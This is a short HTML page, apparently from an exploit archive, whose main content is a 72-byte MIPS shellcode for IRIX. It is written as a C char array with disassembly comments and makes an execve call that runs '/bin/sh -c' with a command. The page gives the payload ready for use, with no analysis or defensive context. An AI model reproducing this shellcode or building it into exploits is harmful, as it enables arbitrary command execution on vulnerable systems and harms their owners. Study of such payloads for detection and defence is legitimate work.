<html><head><title>Irix - execve(/bin/sh -c) - 72 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
char cmdshellcode[]=
                      &quot;\x04\x10\xff\xff&quot;       /* bltzal  $zero,&lt;_cmdshellcode&gt; */
                      &quot;\x24\x02\x03\xf3&quot;       /* li      $v0,1011              */
                      &quot;\x23\xff\x08\xf4&quot;       /* addi    $ra,$ra,2292          */
                      &quot;\x23\xe4\xf7\x40&quot;       /* addi    $a0,$ra,-2240         */
                      &quot;\x23\xe5\xfb\x24&quot;       /* addi    $a1,$ra,-1244         */
                      &quot;\xaf\xe4\xfb\x24&quot;       /* sw      $a0,-1244($ra)        */
                      &quot;\x23\xe6\xf7\x48&quot;       /* addi    $a2,$ra,-2232         */
                      &quot;\xaf\xe6\xfb\x28&quot;       /* sw      $a2,-1240($ra)        */
                      &quot;\x23\xe6\xf7\x4c&quot;       /* addi    $a2,$ra,-2228         */
                      &quot;\xaf\xe6\xfb\x2c&quot;       /* sw      $a2,-1236($ra)        */
                      &quot;\xaf\xe0\xfb\x30&quot;       /* sw      $zero,-1232($ra)      */
                      &quot;\xa3\xe0\xf7\x47&quot;       /* sb      $zero,-2233($ra)      */
                      &quot;\xa3\xe0\xf7\x4a&quot;       /* sb      $zero,-2230($ra)      */
                      &quot;\x02\x04\x8d\x0c&quot;       /* syscall                       */
                      &quot;\x01\x08\x40\x25&quot;       /* or      $t0,$t0,$t0           */
                      &quot;/bin/sh -c  &quot;
                  ;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
